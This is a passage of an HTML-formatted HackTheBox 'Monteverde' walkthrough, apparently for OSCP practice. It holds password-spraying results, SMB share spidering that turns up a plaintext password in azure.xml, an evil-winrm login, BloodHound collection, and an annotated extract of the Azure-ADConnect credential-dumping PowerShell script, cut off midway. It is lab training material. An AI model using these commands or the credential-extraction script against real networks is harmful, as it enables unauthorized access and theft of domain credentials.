+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\s</span>vc-ata:svc-ata<span style="color: #F8F8F2"> </span>STATUS_LOGON_FAILURE<span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\s</span>vc-bexec:svc-bexec<span style="color: #F8F8F2"> </span>STATUS_LOGON_FAILURE<span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\s</span>vc-netapp:svc-netapp<span style="color: #F8F8F2"> </span>STATUS_LOGON_FAILURE<span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\d</span>galanos:dgalanos<span style="color: #F8F8F2"> </span>STATUS_LOGON_FAILURE<span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\r</span>oleary:roleary<span style="color: #F8F8F2"> </span>STATUS_LOGON_FAILURE<span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\s</span>morgan:smorgan<span style="color: #F8F8F2"> </span>STATUS_LOGON_FAILURE<span style="color: #F8F8F2"> </span>
+</code></pre></div>
+
+<p><img alt="Checking for weak creds" src="../imgs/assets-monteverde/MONTEVERDE_DEFAULT.png" title="Checking for weak creds" /></p>
+<p>Success! The SABatchJobs user has their password set to their username. </p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>SABatchJobs<span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>SABatchJobs
+</code></pre></div>
+
+<h2 id="initial-access">Initial Access</h2>
+<h3 id="sabatchjobs-gtmhope">SABatchJobs-&gt;mhope</h3>
+<p>Since we now some have initial crez, let's see if there is anything interesting on the SMB shares.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Monteverde<span style="color: #F8F8F2"> </span>23s<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>nxc<span style="color: #F8F8F2"> </span>smb<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span>SABatchJobs<span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span>SABatchJobs<span style="color: #F8F8F2"> </span>--shares<span style="color: #F8F8F2">                 </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>*<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2019</span><span style="color: #F8F8F2"> </span>Build<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">17763</span><span style="color: #F8F8F2"> </span>x64<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>name:MONTEVERDE<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>domain:MEGABANK.LOCAL<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>signing:True<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SMBv1:False<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>+<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\S</span>ABatchJobs:SABatchJobs<span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>*<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Enumerated<span style="color: #F8F8F2"> </span>shares
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>Share<span style="color: #F8F8F2">           </span>Permissions<span style="color: #F8F8F2">     </span>Remark
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>-----<span style="color: #F8F8F2">           </span>-----------<span style="color: #F8F8F2">     </span>------
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>ADMIN$<span style="color: #F8F8F2">                          </span>Remote<span style="color: #F8F8F2"> </span>Admin
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>azure_uploads<span style="color: #F8F8F2">   </span>READ<span style="color: #F8F8F2">            </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>C$<span style="color: #F8F8F2">                              </span>Default<span style="color: #F8F8F2"> </span>share
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>E$<span style="color: #F8F8F2">                              </span>Default<span style="color: #F8F8F2"> </span>share
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>IPC$<span style="color: #F8F8F2">            </span>READ<span style="color: #F8F8F2">            </span>Remote<span style="color: #F8F8F2"> </span>IPC
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>NETLOGON<span style="color: #F8F8F2">        </span>READ<span style="color: #F8F8F2">            </span>Logon<span style="color: #F8F8F2"> </span>server<span style="color: #F8F8F2"> </span>share<span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>SYSVOL<span style="color: #F8F8F2">          </span>READ<span style="color: #F8F8F2">            </span>Logon<span style="color: #F8F8F2"> </span>server<span style="color: #F8F8F2"> </span>share<span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>users$<span style="color: #F8F8F2">          </span>READ<span style="color: #F8F8F2">            </span>
+</code></pre></div>
+
+<p><img alt="Listing the shares" src="../imgs/assets-monteverde/MONTEVERDE_SMB_1.png" title="Listing the shares" /></p>
+<p>The <code>azure_uploads</code> and <code>users$</code> stick out to me. </p>
+<p>Now, there are two ways we could go about enumerating those shares.</p>
+<ol>
+<li>
+<p>Use impacket-smbclient to manually log in using the SABatchJobs user and enumerate them manually</p>
+</li>
+<li>
+<p>Use a nxc module created for 'spidering' the shares, so we can get an overview of all the files in it. We can then thereafter go and download the files that intrigue us.</p>
+</li>
+</ol>
+<p>The module is called spider_plus.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Monteverde<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>nxc<span style="color: #F8F8F2"> </span>smb<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span>SABatchJobs<span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span>SABatchJobs<span style="color: #F8F8F2"> </span>-M<span style="color: #F8F8F2"> </span>spider_plus
+
+~/htb/boxes/OSCP-PREP/Monteverde<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>cat<span style="color: #F8F8F2"> </span>/home/ma1ware/.nxc/modules/nxc_spider_plus/10.129.228.111.json<span style="color: #F8F8F2">  | </span>jq<span style="color: #F8F8F2"> </span>.
+
+<span style="color: #F8F8F2">  </span><span style="color: #E6DB74">&quot;azure_uploads&quot;</span>:<span style="color: #F8F8F2"> </span><span style="color: #FF4689">{}</span>,
+<span style="color: #F8F8F2">  </span><span style="color: #E6DB74">&quot;users</span>$<span style="color: #E6DB74">&quot;</span>:<span style="color: #F8F8F2"> </span><span style="color: #FF4689">{</span>
+<span style="color: #F8F8F2">    </span><span style="color: #E6DB74">&quot;mhope/azure.xml&quot;</span>:<span style="color: #F8F8F2"> </span><span style="color: #FF4689">{</span>
+<span style="color: #F8F8F2">      </span><span style="color: #E6DB74">&quot;atime_epoch&quot;</span>:<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;2020-01-03 16:41:18&quot;</span>,
+<span style="color: #F8F8F2">      </span><span style="color: #E6DB74">&quot;ctime_epoch&quot;</span>:<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;2020-01-03 16:39:53&quot;</span>,
+<span style="color: #F8F8F2">      </span><span style="color: #E6DB74">&quot;mtime_epoch&quot;</span>:<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;2020-01-03 17:59:24&quot;</span>,
+<span style="color: #F8F8F2">      </span><span style="color: #E6DB74">&quot;size&quot;</span>:<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;1.18 KB&quot;</span>
+<span style="color: #F8F8F2">    </span><span style="color: #FF4689">}</span>
+<span style="color: #F8F8F2">  </span><span style="color: #FF4689">}</span>
+</code></pre></div>
+
+<p><img alt="Finding the file" src="../imgs/assets-monteverde/MONTEVERDE_SPIDER_PLUS.png" title="Finding the file" /></p>
+<p>The <code>azure_uploads</code> is empty, we also don't have any write permissions for it at the current time. There is a file in <code>users$</code> named azure.xml in mhope's folder! </p>
+<p>Downloading the file</p>
+<p><img alt="Getting the file" src="../imgs/assets-monteverde/MONTEVERDE_AZURE.png" title="Getting the file" /></p>
+<p>The file contains the following:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #FF4689">&lt;Objs</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Version=</span><span style="color: #E6DB74">&quot;1.1.0.1&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">xmlns=</span><span style="color: #E6DB74">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span><span style="color: #FF4689">&gt;</span>
+<span style="color: #F8F8F2">  </span><span style="color: #FF4689">&lt;Obj</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">RefId=</span><span style="color: #E6DB74">&quot;0&quot;</span><span style="color: #FF4689">&gt;</span>
+<span style="color: #F8F8F2">    </span><span style="color: #FF4689">&lt;TN</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">RefId=</span><span style="color: #E6DB74">&quot;0&quot;</span><span style="color: #FF4689">&gt;</span>
+<span style="color: #F8F8F2">      </span><span style="color: #FF4689">&lt;T&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span style="color: #FF4689">&lt;/T&gt;</span>
+<span style="color: #F8F8F2">      </span><span style="color: #FF4689">&lt;T&gt;</span>System.Object<span style="color: #FF4689">&lt;/T&gt;</span>
+<span style="color: #F8F8F2">    </span><span style="color: #FF4689">&lt;/TN&gt;</span>
+<span style="color: #F8F8F2">    </span><span style="color: #FF4689">&lt;ToString&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span style="color: #FF4689">&lt;/ToString&gt;</span>
+<span style="color: #F8F8F2">    </span><span style="color: #FF4689">&lt;Props&gt;</span>
+<span style="color: #F8F8F2">      </span><span style="color: #FF4689">&lt;DT</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">N=</span><span style="color: #E6DB74">&quot;StartDate&quot;</span><span style="color: #FF4689">&gt;</span>2020-01-03T05:35:00.7562298-08:00<span style="color: #FF4689">&lt;/DT&gt;</span>
+<span style="color: #F8F8F2">      </span><span style="color: #FF4689">&lt;DT</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">N=</span><span style="color: #E6DB74">&quot;EndDate&quot;</span><span style="color: #FF4689">&gt;</span>2054-01-03T05:35:00.7562298-08:00<span style="color: #FF4689">&lt;/DT&gt;</span>
+<span style="color: #F8F8F2">      </span><span style="color: #FF4689">&lt;G</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">N=</span><span style="color: #E6DB74">&quot;KeyId&quot;</span><span style="color: #FF4689">&gt;</span>00000000-0000-0000-0000-000000000000<span style="color: #FF4689">&lt;/G&gt;</span>
+<span style="color: #F8F8F2">      </span><span style="color: #FF4689">&lt;S</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">N=</span><span style="color: #E6DB74">&quot;Password&quot;</span><span style="color: #FF4689">&gt;</span>4n0therD4y@n0th3r$<span style="color: #FF4689">&lt;/S&gt;</span>
+<span style="color: #F8F8F2">    </span><span style="color: #FF4689">&lt;/Props&gt;</span>
+<span style="color: #F8F8F2">  </span><span style="color: #FF4689">&lt;/Obj&gt;</span>
+<span style="color: #FF4689">&lt;/Objs&gt;</span>
+</code></pre></div>
+
+<p>Since we found this in mhope's folder we can safely assume that this password belongs to them.</p>
+<p>We can use nxc to confirm that the credentials are valid. (they are!)</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>mhope<span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>4n0therD4y@n0th3r$
+</code></pre></div>
+
+<p>Running the creds against winrm protocol using nxc also reveals that the credentials are also valid there.</p>
+<p>Logging into the box using evil-winrm</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Monteverde<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>evil-winrm<span style="color: #F8F8F2"> </span>-i<span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span>mhope<span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;4n0therD4y@n0th3r$&#39;</span><span style="color: #F8F8F2">                                                                                                   </span>
+
+Evil-WinRM<span style="color: #F8F8F2"> </span>shell<span style="color: #F8F8F2"> </span>v3.7<span style="color: #F8F8F2">                                                                                                                                                                              </span>
+
+*Evil-WinRM*<span style="color: #F8F8F2"> </span>PS<span style="color: #F8F8F2"> </span>C:<span style="color: #AE81FF">\U</span>sers<span style="color: #AE81FF">\m</span>hope<span style="color: #AE81FF">\D</span>ocuments&gt;<span style="color: #F8F8F2"> </span>whoami<span style="color: #F8F8F2">                                                                                                                                                   </span>
+megabank<span style="color: #AE81FF">\m</span>hope
+</code></pre></div>
+
+<p>user.txt: 5d0c9f63d1327842f02bd437f5b92dd2</p>
+<h2 id="post-exploitation">Post-Exploitation</h2>
+<h3 id="mhope-gtadministrator">mhope-&gt;Administrator</h3>
+<p>I then proceed to run a bloodhound ingestor so I can get an overview of what the AD environment is like. Probably should have used my latest creds but it doesn't make a difference.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Monteverde/bh<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>bloodhound-python<span style="color: #F8F8F2"> </span>-d<span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;SABatchJobs&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;SABatchJobs&#39;</span><span style="color: #F8F8F2"> </span>--zip<span style="color: #F8F8F2"> </span>-c<span style="color: #F8F8F2"> </span>All<span style="color: #F8F8F2"> </span>-ns<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.228.111
+INFO:<span style="color: #F8F8F2"> </span>BloodHound.py<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span>BloodHound<span style="color: #F8F8F2"> </span>LEGACY<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>BloodHound<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">4</span>.2<span style="color: #F8F8F2"> </span>and<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">4</span>.3<span style="color: #FF4689">)</span>
+INFO:<span style="color: #F8F8F2"> </span>Found<span style="color: #F8F8F2"> </span>AD<span style="color: #F8F8F2"> </span>domain:<span style="color: #F8F8F2"> </span>megabank.local
+INFO:<span style="color: #F8F8F2"> </span>Getting<span style="color: #F8F8F2"> </span>TGT<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span>user
+INFO:<span style="color: #F8F8F2"> </span>Connecting<span style="color: #F8F8F2"> </span>to<span style="color: #F8F8F2"> </span>LDAP<span style="color: #F8F8F2"> </span>server:<span style="color: #F8F8F2"> </span>MONTEVERDE.MEGABANK.LOCAL
+INFO:<span style="color: #F8F8F2"> </span>Found<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2"> </span>domains
+INFO:<span style="color: #F8F8F2"> </span>Found<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2"> </span>domains<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">in</span><span style="color: #F8F8F2"> </span>the<span style="color: #F8F8F2"> </span>forest
+INFO:<span style="color: #F8F8F2"> </span>Found<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2"> </span>computers
+INFO:<span style="color: #F8F8F2"> </span>Connecting<span style="color: #F8F8F2"> </span>to<span style="color: #F8F8F2"> </span>LDAP<span style="color: #F8F8F2"> </span>server:<span style="color: #F8F8F2"> </span>MONTEVERDE.MEGABANK.LOCAL
+INFO:<span style="color: #F8F8F2"> </span>Found<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">13</span><span style="color: #F8F8F2"> </span>users
+INFO:<span style="color: #F8F8F2"> </span>Found<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">65</span><span style="color: #F8F8F2"> </span>groups
+INFO:<span style="color: #F8F8F2"> </span>Found<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2"> </span>gpos
+INFO:<span style="color: #F8F8F2"> </span>Found<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">9</span><span style="color: #F8F8F2"> </span>ous
+INFO:<span style="color: #F8F8F2"> </span>Found<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">19</span><span style="color: #F8F8F2"> </span>containers
+INFO:<span style="color: #F8F8F2"> </span>Found<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> </span>trusts
+INFO:<span style="color: #F8F8F2"> </span>Starting<span style="color: #F8F8F2"> </span>computer<span style="color: #F8F8F2"> </span>enumeration<span style="color: #F8F8F2"> </span>with<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2"> </span>workers
+INFO:<span style="color: #F8F8F2"> </span>Querying<span style="color: #F8F8F2"> </span>computer:<span style="color: #F8F8F2"> </span>MONTEVERDE.MEGABANK.LOCAL
+INFO:<span style="color: #F8F8F2"> </span>Done<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">in</span><span style="color: #F8F8F2"> </span>01M<span style="color: #F8F8F2"> </span>11S
+INFO:<span style="color: #F8F8F2"> </span>Compressing<span style="color: #F8F8F2"> </span>output<span style="color: #F8F8F2"> </span>into<span style="color: #F8F8F2"> </span>20250322202058_bloodhound.zip
+</code></pre></div>
+
+<p>I see that the mhope user is part of the Azure Admins group but nothing else. After wasting a bit of time here, I safely conclude that there is really nothing else interesting in the output. So I can now proceed to enumerate on the box itself.</p>
+<h4 id="analysis">Analysis</h4>
+<p>I find a .Azure directory in mhope's home directory.</p>
+<p>Simply googlging around for Azure Admins group privesc leads me to this script:  https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1</p>
+<p>Let's break it down step by step so we know what we are running on our target environment!</p>
+<p>tl;dr: Script fetches some stuff from the database, script then fetches encrypted stuff from the database, script decodes encrypted stuff using stuff from first fetch, script prints out decrypted stuff in a good format</p>
+<p>You can skip this section if you want.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #66D9EF">Function</span> <span style="color: #F8F8F2">Azure-ADConnect</span> <span style="color: #F8F8F2">{</span><span style="color: #66D9EF">param</span><span style="color: #F8F8F2">($db,$server)</span>
+<span style="color: #F8F8F2">$help</span> <span style="color: #F8F8F2">=</span> <span style="color: #E6DB74">@&quot;</span>
+<span style="color: #E6DB74">.SYNOPSIS</span>
+<span style="color: #E6DB74">    Azure-ADConnect</span>
+<span style="color: #E6DB74">    PowerShell Function: Azure-ADConnect</span>
+<span style="color: #E6DB74">    Author: Luis Vacas (CyberVaca)</span>
+<span style="color: #E6DB74">    Based on: https://blog.xpnsec.com/azuread-connect-for-redteam/</span>
+
+<span style="color: #E6DB74">    Required dependencies: None</span>
+<span style="color: #E6DB74">    Optional dependencies: None</span>
+<span style="color: #E6DB74">.DESCRIPTION</span>
+
+<span style="color: #E6DB74">.EXAMPLE</span>
+<span style="color: #E6DB74">    Azure-ADConnect -server 10.10.10.10 -db ADSync</span>
+
+<span style="color: #E6DB74">    Description</span>
+<span style="color: #E6DB74">    -----------</span>
+<span style="color: #E6DB74">    Extract credentials from the Azure AD Connect service.</span>
+
+<span style="color: #E6DB74">&quot;@</span>
+</code></pre></div>
+
+<p>This gives us a general overview of what the script does.</p>
+<p>The function is called Azure-ADConnect and it takes in two parameters:</p>
+<ol>
+<li>
+<p>The IP address of the server - in our case 127.0.0.1 since we are going to run it in box itself. -</p>
+</li>
+<li>
+<p>The name of the database - in our case it is ADSync - </p>
+</li>
+</ol>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #66D9EF">if</span> <span style="color: #F8F8F2">($db</span> <span style="color: #FF4689">-eq</span> <span style="color: #F8F8F2">$null</span> <span style="color: #FF4689">-or</span> <span style="color: #F8F8F2">$server</span> <span style="color: #FF4689">-eq</span> <span style="color: #F8F8F2">$null)</span> <span style="color: #F8F8F2">{</span>
+  <span style="color: #F8F8F2">$help</span> <span style="color: #959077"># Print out the help screen if parameters are not specified</span>
+<span style="color: #F8F8F2">}</span> <span style="color: #66D9EF">else</span> <span style="color: #F8F8F2">{</span>
+ <span style="color: #959077"># Setup a connection to the SQL server using paramters as well as the current user&#39;s token (credentials)</span>
+ <span style="color: #F8F8F2">$client</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">new-object</span> <span style="color: #F8F8F2">System.Data.SqlClient.SqlConnection</span> <span style="color: #F8F8F2">-ArgumentList</span> <span style="color: #E6DB74">&quot;Server = $server; Database = $db; Initial Catalog=$db;Integrated Security = True;&quot;</span>
+
+ <span style="color: #959077"># Open the connection to the server</span>
+ <span style="color: #F8F8F2">$client.Open()</span> 
+
+ <span style="color: #959077"># Create a command to run</span>
+ <span style="color: #F8F8F2">$cmd</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">$client.CreateCommand()</span>
+ <span style="color: #F8F8F2">$cmd.CommandText</span> <span style="color: #F8F8F2">=</span> <span style="color: #E6DB74">&quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;</span>
+
+ <span style="color: #959077"># Execute the command</span>
+ <span style="color: #F8F8F2">$reader</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">$cmd.ExecuteReader()</span>
+
+ <span style="color: #959077"># Fetch important stuff that we need</span>
+ <span style="color: #F8F8F2">$reader.Read()</span> <span style="color: #F8F8F2">|</span> <span style="color: #F8F8F2">Out-Null</span>
+ <span style="color: #F8F8F2">$key_id</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">$reader.GetInt32(0)</span>
+ <span style="color: #F8F8F2">$instance_id</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">$reader.GetGuid(1)</span>
+ <span style="color: #F8F8F2">$entropy</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">$reader.GetGuid(2)</span>
+
+ <span style="color: #959077"># Close the connection</span>
+ <span style="color: #F8F8F2">$reader.Close()</span>
+</code></pre></div>
+
+<p>Detailed explanation:<br />
+The program checks to see if the db or the server paramter are empty. If so it proceeds to print out the help section.</p>
+<p>If we pass the initial check, it then proceeds to set up a connection to a SQL Server using the aforementioned paramters (db name, and server) as well as using the current users credentials (mhope).</p>
+<p>After openeing the connection, it creates an SQL query<br />
+<code>SELECT keyset_id, instance_id, entropy FROM mms_server_configuration</code> and then runs it on the server.</p>
+<p>This query extracts 3 things</p>
+<ol>
+<li>The key (an int), sample output: 1</li>
+<li>The instance_id (a GUID), sample output: 1852b527-dd4f-4ecf-b541-efccbff29e31</li>
+<li>entropy (a GUID), sample output: 194ec2fc-f186-46cf-b44d-071eb61f49cd</li>
+</ol>
+<p>We will need this later in order to decrypt the encrypted format.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #959077"># Create another command</span>
+<span style="color: #F8F8F2">$cmd</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">$client.CreateCommand()</span>
+<span style="color: #F8F8F2">$cmd.CommandText</span> <span style="color: #F8F8F2">=</span> <span style="color: #E6DB74">&quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#39;AD&#39;&quot;</span>
+
+<span style="color: #959077"># Execute the command</span>
+<span style="color: #F8F8F2">$reader</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">$cmd.ExecuteReader()</span>
+
+<span style="color: #959077"># Fetch the output</span>
+<span style="color: #F8F8F2">$reader.Read()</span> <span style="color: #F8F8F2">|</span> <span style="color: #F8F8F2">Out-Null</span>
+<span style="color: #F8F8F2">$config</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">$reader.GetString(0)</span>
+<span style="color: #F8F8F2">$crypted</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">$reader.GetString(1)</span>
+
+<span style="color: #959077"># Close the connection</span>
